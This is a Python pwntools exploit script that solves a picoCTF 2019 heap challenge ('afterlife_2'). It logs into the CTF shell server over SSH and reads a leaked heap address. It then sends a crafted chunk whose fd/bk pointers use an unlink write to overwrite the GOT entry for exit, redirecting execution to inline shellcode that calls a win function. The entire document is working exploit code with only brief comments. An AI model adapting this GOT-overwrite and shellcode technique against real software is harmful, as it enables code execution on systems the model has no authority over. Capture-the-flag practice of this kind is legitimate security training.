from pwn import *

# [  prev_size  ][    size    ][     fd    ][    bk    ][     data          ]
#                              [got.exit-12][  first+8 ][shellcode          ] 


# Constants
DIR = '/problems/afterlife_2_049150f2f8b03c16dc0382de6e2e2215/'

shell = ssh('kscieslinski', '2019shell1.picoctf.com', password='XXXX', port=22)
p = shell.process([DIR + 'vuln', 'AAAAAAA'], cwd=DIR)
elf = ELF('vuln') #  as p.elf doesn't work via ssh shell

exitgot_addr = elf.symbols['got.exit']

# shellcode which will call win func:
# shellcode:
#  mov eax,0x08048966  (win func address)
#  call eax
shellcode = b'\xb8\x66\x89\x04\x08\xff\xd0'

p.recvline() #  ("Oops! a new developer copy pasted and printed an address as a decimal...\n"
first_addr = int(p.recvline()[:-1])

payload = p32(exitgot_addr - 12) + p32(first_addr + 8) + shellcode
p.sendline(payload)

p.stream()